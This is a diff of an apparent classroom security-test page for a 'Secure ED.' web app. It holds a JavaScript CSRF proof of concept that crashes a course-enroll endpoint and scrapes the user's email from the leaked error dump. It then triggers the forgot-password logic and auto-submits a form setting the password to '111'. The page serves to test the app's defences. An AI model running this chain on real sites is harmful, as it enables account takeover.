@@ -12,7 +12,7 @@ require_once "../src/DBController.php";
     <link rel="icon" type="image/svg" href="../resources/Header_Lock_Image.svg">
     <script async src="../resources/nav.js"></script>
     <meta charset="utf-8" />
-    <title>Secure App Tests - CSRF Test</title>
+    <title>Secure ED. Tests - CSRF Test</title>
 </head>
 
 <body>
@@ -22,7 +22,7 @@ require_once "../src/DBController.php";
                 <tbody>
                 <tr>
                     <td class="lock"><img src="../resources/Header_Lock_Image.svg" style="width:9vh;" alt="Header_lock"></td>
-                    <td class="title"><b>Secure App Tests</b></td>
+                    <td class="title"><b>Secure ED. Tests</b></td>
                     <td class="header_table_cell"></td>
                 </tr>
                 </tbody>
@@ -128,6 +128,9 @@ require_once "../src/DBController.php";
 
         function ajaxSend()
         {
+            //The only use case that uses session data is Course Enroll.
+            //So, we need to crash it to get the error report and get the email from that.
+
             // (A) CREATE BLANK FORM (to crash course enroll)
             var data1 = new FormData();
 
@@ -137,21 +140,22 @@ require_once "../src/DBController.php";
             xhr1.onload = function () {
                 let crashData = this.response;
                 //we need to obtain the email from crashData: it looks like the following
-                //["email"]=> string(some number) "Email appears here"
+                //["email"]=> string(some number) "Email appears here" ["next var"]...
 
                 //get the email
                 let email = crashData.substr(crashData.indexOf('["email"]=>')+ 11).slice(0, -1);
                 email = email.substr(email.indexOf('"')+ 1).slice(0, -1);
-                email = email.split('"')[0];
+                email = email.split('" ')[0];
 
                 // (C) APPEND EMAIL TO OUR NEW FORM
                 var data2 = new FormData();
                 data2.append('email', email);
 
-                // (D) AJAX REQUEST (sets up Forgot Password to change the correct password)
+                // (D) AJAX REQUEST (sets up Forgot Password by changing tmp.txt to have the correct email)
                 var xhr2 = new XMLHttpRequest();
                 xhr2.open('POST', "../src/ForgotPasswordLogic.php", true);
                 xhr2.onload = function () {
+                    //submits the form with the new password and confirm password of 111
                     document.changepassword.submit();
                 }
                 xhr2.send(data2);
